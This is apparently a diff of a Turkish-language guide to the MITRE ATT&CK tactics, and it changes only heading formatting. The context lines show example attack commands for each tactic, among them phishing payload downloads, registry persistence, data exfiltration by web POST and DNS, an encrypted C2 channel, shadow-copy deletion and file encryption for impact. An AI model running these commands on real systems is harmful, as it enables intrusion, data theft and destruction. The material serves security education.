@@ -13,7 +13,7 @@ MITRE, 1958 yılında Amerika Birleşik Devletleri sponsorluğunda kurulan, akad
 > Kısaca ABD ulusal güvenliğine hizmet eden, kar amacı gütmeyen, köklü ve büyük bir kuruluştur diyebiliriz.
 > 
 
-# MITRE **ATT&CK Framework**
+# MITRE ATT&CK Framework
 
 Saldırganlar akıllıdır, ısrarcıdır, kolay adapte olurlar, başarılı veya başarısız denemelerden öğrenirler. Bilgi çalarlar, sistemlere ve şirketlere zarar verirler. Fakat saldırganlardan öğrenebileceğimiz çok şey var ve burada MITRE devreye giriyor. MITRE ATT&CK (Adversarial tactics, techniques, and common knowledge) global bir saldırgan davranışlarına ilişkin bilgileri barındıran frameworktür. ATT&CK, saldırganlar tarafından kullanılan taktikleri, teknikleri ve prosedürleri barındırır. Saldırganların hangi taktikleri, teknikleri, prosedürleri kullandığını ve davranışlarını kavramamız, onlara engel olmak için önemlidir. 
 
@@ -50,15 +50,15 @@ Bu taktiklerin içinde teknikler ve alt teknikler vardır. Teknikler, taktiğin 
 
 # Taktik, Teknik ve Saldırı Komutları
 
-## **Reconnaissance (T1595)**
+## Reconnaissance (T1595)
 
 Saldırıyı planlamak, atak vektörünü genişletmek ve hedef hakkında bilgi toplamak için aktif veya pasif bilgi toplama işlemi yapılır. Bu tür bilgiler hedefin altyapısının veya personellerin ayrıntılarını içerebilir.
 
-1. **Active Scanning (T1595)**
+1. Active Scanning (T1595)
     
     Aktif tarama, doğrudan karşı sistem ile etkileşime geçerek yapılan taramalardır.
     
-    1. **Scanning IP Blocks (T1595.001)**
+    1. Scanning IP Blocks (T1595.001)
         
         Örnek saldırı komutu:
         
@@ -67,7 +67,7 @@ Saldırıyı planlamak, atak vektörünü genişletmek ve hedef hakkında bilgi 
         nmap -p- 192.168.10.0/24
         ```
         
-    2. **Vulnerability Scanning (T1595.002)**
+    2. Vulnerability Scanning (T1595.002)
         
         Örnek saldırı komutu:
         
@@ -76,11 +76,11 @@ Saldırıyı planlamak, atak vektörünü genişletmek ve hedef hakkında bilgi 
         nmap -sS -sU -p- -pN -O --script all -sV --allports --version-all -T5 192.168.10.1
         ```
         
-2. **Gather Victim Host Information (T1592)**
+2. Gather Victim Host Information (T1592)
     
     Hedef sistem sunucuları hakkında bilgi toplama aşamasıdır. IP adresleri, işletim sistemleri vs. tespit edilir.
     
-    1. **Hardware (T1592.001)**
+    1. Hardware (T1592.001)
         
         Örnek saldırı komutu:
         
@@ -91,28 +91,28 @@ Saldırıyı planlamak, atak vektörünü genişletmek ve hedef hakkında bilgi 
 
 ---
 
-## **Resource Development (TA0042)**
+## Resource Development (TA0042)
 
 Saldırıyı desteklemek için gerekli kaynaklar oluşturulur. Bu tür kaynaklar arasında altyapı, hesaplar veya yetenekler yer alır. Bu kaynaklar, Komuta ve Kontrolü desteklemek için satın alınan domainleri, ilk Erişimin bir parçası olarak phishing için e-posta hesaplarını kullanmak veya defence evasiona yardımcı olmak için code sign sertifikalarını çalmak gibi saldırı yaşam döngüsünün diğer aşamalarına yardımcı olmak için saldırgan tarafından kullanılabilir.
 
-1. **Acquire Access (T1650)**
-2. **Acquire Infrastructure (T1583)**
-3. **Compromise Accounts (T1586)**
-4. **Compromise Infrastructure (T1584)**
-5. **Develop Capabilities (T1587)**
-6. **Establish Accounts (T1585)**
-7. **Obtain Capabilities (T1588)**
-8. **Stage Capabilities (T1608)**
+1. Acquire Access (T1650)
+2. Acquire Infrastructure (T1583)
+3. Compromise Accounts (T1586)
+4. Compromise Infrastructure (T1584)
+5. Develop Capabilities (T1587)
+6. Establish Accounts (T1585)
+7. Obtain Capabilities (T1588)
+8. Stage Capabilities (T1608)
 
-## **Initial Access (TA0001)**
+## Initial Access (TA0001)
 
 Hedef sisteme ilk erişimin kazanılır. Hedef sistemde yer edinmek için kullanılan teknikler arasında phishing ve public web sunucularındaki zafiyetlerden yararlanma yer alır.
 
-1. **Phishing (T1566)**
+1. Phishing (T1566)
     
     Phishing ile ilk erişim elde edilmeye çalışılır.
     
-    1. **Spearphishing Attachment (T1566.001)**
+    1. Spearphishing Attachment (T1566.001)
         
         Örnek komut:
         
@@ -126,7 +126,7 @@ Hedef sisteme ilk erişimin kazanılır. Hedef sistemde yer edinmek için kullan
         Remove-Item $env:TEMP\Dosya.xlsm -ErrorAction Ignore
         ```
         
-2. **Supply Chain Compromise (T1195)**
+2. Supply Chain Compromise (T1195)
     
     Ürün-hizmet teslim mekanizması manipule edilir.
     
@@ -151,11 +151,11 @@ Hedef sisteme ilk erişimin kazanılır. Hedef sistemde yer edinmek için kullan
 
 ---
 
-## **Execution (TA0002)**
+## Execution (TA0002)
 
 Local veya remote sistemde komut çalıştırılır. Zararlı kod çalıştıran teknikler genellikle bir ağı keşfetmek veya veri çalmak gibi daha geniş hedeflere ulaşmak için diğer tüm taktiklerdeki tekniklerle eşleştirilir.
 
-1. **Deploy Container (T1610)**
+1. Deploy Container (T1610)
     
     Örnek komut:
     
@@ -177,7 +177,7 @@ Local veya remote sistemde komut çalıştırılır. Zararlı kod çalıştıran
     sudo systemctl start docker
     ```
     
-2. **Container Administration Command (T1609)**
+2. Container Administration Command (T1609)
     
     Örnek komut:
     
@@ -198,11 +198,11 @@ Local veya remote sistemde komut çalıştırılır. Zararlı kod çalıştıran
     docker exec -i t1609_container bash -c "cat /tmp/output.txt"
     ```
     
-3. **System Services (T1569)**
+3. System Services (T1569)
     
     Sistem servisleri kullanılarak komut çalıştırılır.
     
-    1. **Launchctl (T1569.001)**
+    1. Launchctl (T1569.001)
         
         Örnek komut:
         
@@ -214,7 +214,7 @@ Local veya remote sistemde komut çalıştırılır. Zararlı kod çalıştıran
         launchctl remove #{label_name}
         ```
         
-    2. **Service Execution (T1569.002)**
+    2. Service Execution (T1569.002)
         
         ```bash
         sc.exe create #{service_name} binPath= "#{executable_command}"
@@ -240,11 +240,11 @@ Local veya remote sistemde komut çalıştırılır. Zararlı kod çalıştıran
 
 ---
 
-## **Persistence (TA0003)**
+## Persistence (TA0003)
 
 Sistemde kalıcı olunur. Kalıcılık, sistemlerin yeniden başlatmalarına karşı, değişen kimlik bilgileri veya erişimleri kesebilecek diğer kesintiler karşısında sistemlere erişimlerini sürdürmek için kullandıkları tekniklerden oluşur.
 
-1. **Event Triggered Execution (T1546)**
+1. Event Triggered Execution (T1546)
     
     Örnek komut:
     
@@ -265,7 +265,7 @@ Sistemde kalıcı olunur. Kalıcılık, sistemlerin yeniden başlatmalarına kar
     New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "#{command}" -PropertyType "String"
     ```
     
-2. **Office Application Startup (T1137)**
+2. Office Application Startup (T1137)
     
     Örnek komut:
     
@@ -283,11 +283,11 @@ Sistemde kalıcı olunur. Kalıcılık, sistemlerin yeniden başlatmalarına kar
 
 ---
 
-## **Privilege Escalation (TA0004)**
+## Privilege Escalation (TA0004)
 
 Yetki yükseltilir. Yetki yükseltme, saldırganların bir sistem veya ağ üzerinde daha üst düzey izinler elde etmek için kullandıkları tekniklerden oluşur. Saldırganlar genellikle yetkisiz erişimle bir ağa girebilir ve ağı keşfedebilir, ancak hedeflerini gerçekleştirmek için daha fazla izinlere ihtiyaç duyarlar.
 
-1. **Escape to Host (T1611)**
+1. Escape to Host (T1611)
     
     Örnek komut:
     
@@ -325,7 +325,7 @@ Yetki yükseltilir. Yetki yükseltme, saldırganların bir sistem veya ağ üzer
     if [ "`capsh --print | grep cap_sys_admin`" == "" ]; then echo "Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
     ```
     
-2. **Boot or Logon Autostart Execution (T1547)**
+2. Boot or Logon Autostart Execution (T1547)
     
     Örnek komut:
     
@@ -336,11 +336,11 @@ Yetki yükseltilir. Yetki yükseltme, saldırganların bir sistem veya ağ üzer
 
 ---
 
-## **Defense Evasion (TA0005)**
+## Defense Evasion (TA0005)
 
 Savunma sistemlerinden kaçılır, tespit edilememek amaçlanır. Savunmadan kaçınma için kullanılan teknikler arasında güvenlik yazılımının kaldırılması/devre dışı bırakılması veya veri ve komut dosyalarının gizlenmesi/şifrelenmesi yer alır. Saldırganlar ayrıca kötü amaçlı yazılımlarını gizlemek ve maskelemek için güvenilir olarak tanımlanan süreçlerden yararlanır ve bunları kötüye kullanır.
 
-1. **Plist File Modification (T1647)**
+1. Plist File Modification (T1647)
     
     Örnek komut:
     
@@ -349,7 +349,7 @@ Savunma sistemlerinden kaçılır, tespit edilememek amaçlanır. Savunmadan ka�
     vim ~/Library/Preferences/com.apple.dock.plist
     ```
     
-2. **Reflective Code Loading (T1620)**
+2. Reflective Code Loading (T1620)
     
     Örnek komut:
     
@@ -359,7 +359,7 @@ Savunma sistemlerinden kaçılır, tespit edilememek amaçlanır. Savunmadan ka�
     mimiload -consoleoutput -noninteractive
     ```
     
-3. **Indirect Command Execution (T1202)**
+3. Indirect Command Execution (T1202)
     
     Örnek komut:
     
@@ -379,11 +379,11 @@ Savunma sistemlerinden kaçılır, tespit edilememek amaçlanır. Savunmadan ka�
 
 ---
 
-## **Credential Access (TA0006)**
+## Credential Access (TA0006)
 
 Kullanıcı adları ve parolaları ele geçirilir. Kimlik bilgilerini elde etmek için kullanılan teknikler arasında keylogging veya credential dumping yer alır. Yetkili kullanıcıların bilgilerini kullanmak, saldırganlara sistemlere erişim sağlayabilir, tespit edilmelerini zorlaştırabilir ve hedeflerine ulaşmalarına yardımcı olmak için daha fazla hesap oluşturma fırsatı sağlayabilir.
 
-1. **Steal or Forge Authentication Certificates (T1649)**
+1. Steal or Forge Authentication Certificates (T1649)
     
     Örnek komut:
     
@@ -397,7 +397,7 @@ Kullanıcı adları ve parolaları ele geçirilir. Kimlik bilgilerini elde etmek
     [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
     ```
     
-2. **Credentials from Password Stores (T1555)**
+2. Credentials from Password Stores (T1555)
     
     Örnek komut:
     
@@ -418,11 +418,11 @@ Kullanıcı adları ve parolaları ele geçirilir. Kimlik bilgilerini elde etmek
 
 ---
 
-## **Discovery (TA0007)**
+## Discovery (TA0007)
 
 Erişilen sistem ve local ağda keşif yapılır. Keşif, saldırganın sistem ve iç ağ hakkında bilgi edinmek için kullanabileceği tekniklerden oluşur. Bu teknikler, düşmanların nasıl hareket edeceklerine karar vermeden önce ortamı gözlemlemelerine ve kendilerini yönlendirmelerine yardımcı olur. Ayrıca düşmanların neleri kontrol edebileceklerini ve giriş noktalarının etrafında neler olduğunu keşfederek mevcut hedeflerine nasıl fayda sağlayabileceklerini keşfetmelerini sağlar.
 
-1. **Cloud Storage Object Discovery (T1619)**
+1. Cloud Storage Object Discovery (T1619)
     
     Örnek komut:
     
@@ -430,7 +430,7 @@ Erişilen sistem ve local ağda keşif yapılır. Keşif, saldırganın sistem v
     for bucket in "$(aws s3 ls | cut -d " " -f3)"; do aws s3api list-objects-v2 --bucket $bucket --output text; done
     ```
     
-2. **Group Policy Discovery (T1615)**
+2. Group Policy Discovery (T1615)
     
     Örnek komut:
     
@@ -448,7 +448,7 @@ Erişilen sistem ve local ağda keşif yapılır. Keşif, saldırganın sistem v
     GPOAudit -noninteractive -consoleoutput
     ```
     
-3. **Software Discovery (T1518)**
+3. Software Discovery (T1518)
     
     Örnek komut:
     
@@ -464,11 +464,11 @@ Erişilen sistem ve local ağda keşif yapılır. Keşif, saldırganın sistem v
 
 ---
 
-## **Lateral Movement (TA0008)**
+## Lateral Movement (TA0008)
 
 Yatay yayılım yapılır. Yatay yayılım, düşmanların bir ağ üzerindeki uzak sistemlere girmek ve bunları kontrol etmek için kullandıkları tekniklerden oluşur. Birincil hedeflerini takip etmek genellikle hedeflerini bulmak için ağı keşfetmeyi ve ardından ona erişim sağlamayı gerektirir. Hedefe ulaşmak için genellikle birden fazla sistem ve hesap arasında geçiş yapmak gerekir. Saldırganlar yatay yayılımı gerçekleştirmek için kendi uzaktan erişim araçlarını yükleyebilir veya daha gizli olabilen yerel ağ ve işletim sistemi araçlarıyla önceden elde ettiği kimlik bilgilerini kullanabilir.
 
-1. **Lateral Tool Transfer (T1570)**
+1. Lateral Tool Transfer (T1570)
     
     Örnek komut:
     
@@ -482,7 +482,7 @@ Yatay yayılım yapılır. Yatay yayılım, düşmanların bir ağ üzerindeki u
     copy '#{local_file}' '*:\'
     ```
     
-2. **Software Deployment Tools (T1072)**
+2. Software Deployment Tools (T1072)
     
     ```powershell
     "%PROGRAMFILES(x86)%/#{radmin_exe}"
@@ -495,11 +495,11 @@ Yatay yayılım yapılır. Yatay yayılım, düşmanların bir ağ üzerindeki u
 
 ---
 
-## **Collection (TA0009)**
+## Collection (TA0009)
 
 Datalar toplanır. Toplama adımı, saldırganların bilgi toplamak için kullanabileceği tekniklerden ve saldırganın hedeflerini takip etmekle ilgili bilgilerin toplandığı kaynaklardan oluşur. Sıklıkla, veri topladıktan sonraki hedef veriyi çalmak/çıkarmaktır (exfiltrate). Hedefler arasında çeşitli sürücü türleri, tarayıcılar, ses, video ve e-postalar yer alır. Ekran görüntülerini ve klavye girişleri yakalanabilir.
 
-1. ****Video Capture (T1125)****
+1. Video Capture (T1125)
     
     Örnek komut:
     
@@ -510,7 +510,7 @@ Datalar toplanır. Toplama adımı, saldırganların bilgi toplamak için kullan
     reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /f
     ```
     
-2. ****Audio Capture (T1123)****
+2. Audio Capture (T1123)
     
     Örnek komut:
     
@@ -518,7 +518,7 @@ Datalar toplanır. Toplama adımı, saldırganların bilgi toplamak için kullan
     powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet
     ```
     
-3. ****Automated Collection (T1119)****
+3. Automated Collection (T1119)
     
     Örnek komut:
     
@@ -544,7 +544,7 @@ Datalar toplanır. Toplama adımı, saldırganların bilgi toplamak için kullan
     tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
     ```
     
-4. ****Data from Local System (T1005)****
+4. Data from Local System (T1005)
     
     Örnek komut:
     
@@ -580,11 +580,11 @@ Datalar toplanır. Toplama adımı, saldırganların bilgi toplamak için kullan
 
 ---
 
-## **Command and Control (TA0011)**
+## Command and Control (TA0011)
 
 Ele geçirilen sistemler kontrol edilir. Komuta kontrol, saldırganın, hedefin ağı içinde kendi kontrolleri altındaki sistemlerle iletişim kurmak için kullanabilecekleri tekniklerden oluşur. Saldırganlar genellikle tespit edilmekten kaçınmak için normal, beklenen trafiği taklit etmeye çalışırlar. Bir saldırganın, hedef ağ yapısına ve savunmasına bağlı olarak çeşitli gizlilik seviyelerinde komuta kontrol kurabileceği birçok yol vardır.
 
-1. ****Encrypted Channel (T1573)****
+1. Encrypted Channel (T1573)
     
     Örnek komut:
     
@@ -607,7 +607,7 @@ Ele geçirilen sistemler kontrol edilir. Komuta kontrol, saldırganın, hedefin 
     $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
     ```
     
-2. ****Protocol Tunneling (T1572)****
+2. Protocol Tunneling (T1572)
     
     Örnek komut:
     
@@ -632,7 +632,7 @@ Ele geçirilen sistemler kontrol edilir. Komuta kontrol, saldırganın, hedefin 
     Stop-Job -Name Job1 | Out-Null
     ```
     
-3. ****Non-Standard Port (T1571)****
+3. Non-Standard Port (T1571)
     
     Örnek komut:
     
@@ -645,7 +645,7 @@ Ele geçirilen sistemler kontrol edilir. Komuta kontrol, saldırganın, hedefin 
     exit 0
     ```
     
-4. ****Remote Access Software (T1219)****
+4. Remote Access Software (T1219)
     
     Örnek komut:
     
@@ -684,11 +684,11 @@ Ele geçirilen sistemler kontrol edilir. Komuta kontrol, saldırganın, hedefin 
 
 ---
 
-## **Exfiltration (TA0010)**
+## Exfiltration (TA0010)
 
 Datalar sızdırılır. Hedefin ağdan veri çalmak için kullanabileceği tekniklerden oluşur. Verileri hedef ağdan çıkarma teknikleri genellikle komuta kontrol kanalları veya alternatif bir kanal üzerinden aktarmayı içerir ve ayrıca aktarıma boyut sınırları koymayı da içerebilir.
 
-1. ****Exfiltration Over Alternative Protocol (T1048)****
+1. Exfiltration Over Alternative Protocol (T1048)
     
     Örnek komut:
     
@@ -705,7 +705,7 @@ Datalar sızdırılır. Hedefin ağdan veri çalmak için kullanabileceği tekni
     Invoke-DNSExfiltrator -i "#{ps_module}" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
     ```
     
-2. ****Exfiltration Over C2 Channel (T1041)****
+2. Exfiltration Over C2 Channel (T1041)
     
     Örnek komut:
     
@@ -718,7 +718,7 @@ Datalar sızdırılır. Hedefin ağdan veri çalmak için kullanabileceği tekni
     Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
     ```
     
-3. ****Data Transfer Size Limits (T1030)****
+3. Data Transfer Size Limits (T1030)
     
     Örnek komut:
     
@@ -727,7 +727,7 @@ Datalar sızdırılır. Hedefin ağdan veri çalmak için kullanabileceği tekni
     ls -l #{folder_path}
     ```
     
-4. ****Automated Exfiltration (T1020)****
+4. Automated Exfiltration (T1020)
     
     Örnek komut:
     
@@ -742,11 +742,11 @@ Datalar sızdırılır. Hedefin ağdan veri çalmak için kullanabileceği tekni
 
 ---
 
-## **Impact (TA0040)**
+## Impact (TA0040)
 
 Veriler manipule edilir, sistem kesintiye uğratılır veya yok edilir. Kullanılan teknikler arasında verilerin yok edilmesi veya bozulması yer alabilir. Bazı durumlarda iş süreçleri iyi görünebilir ancak saldırganların hedeflerine fayda sağlayacak şekilde değiştirilmiş olabilir. Bu teknikler, saldırganlar tarafından nihai hedeflerine ulaşmak için veya bir gizlilik ihlaline karşı koruma sağlamak için kullanılabilir.
 
-1. ****Account Access Removal (T1531)****
+1. Account Access Removal (T1531)
     
     Örnek komut:
     
@@ -770,7 +770,7 @@ Veriler manipule edilir, sistem kesintiye uğratılır veya yok edilir. Kullanı
     }
     ```
     
-2. ****System Shutdown/Reboot (T1529)****
+2. System Shutdown/Reboot (T1529)
     
     Örnek komut:
     
@@ -789,7 +789,7 @@ Veriler manipule edilir, sistem kesintiye uğratılır veya yok edilir. Kullanı
     shutdown /l
     ```
     
-3. ****Resource Hijacking (T1496)****
+3. Resource Hijacking (T1496)
     
     Örnek komut:
     
@@ -797,7 +797,7 @@ Veriler manipule edilir, sistem kesintiye uğratılır veya yok edilir. Kullanı
     yes > /dev/null
     ```
     
-4. ****Inhibit System Recovery (T1490)****
+4. Inhibit System Recovery (T1490)
     
     Örnek komut:
     
@@ -837,7 +837,7 @@ Veriler manipule edilir, sistem kesintiye uğratılır veya yok edilir. Kullanı
     vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%
     ```
     
-5. ****Service Stop (T1489)****
+5. Service Stop (T1489)
     
     ```powershell
     sc.exe stop #{service_name}
@@ -845,7 +845,7 @@ Veriler manipule edilir, sistem kesintiye uğratılır veya yok edilir. Kullanı
     taskkill.exe /f /im #{process_name}
     ```
     
-6. ****Data Encrypted for Impact (T1486)****
+6. Data Encrypted for Impact (T1486)
     
     ```bash
     echo "#{pwd_for_encrypted_file}" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
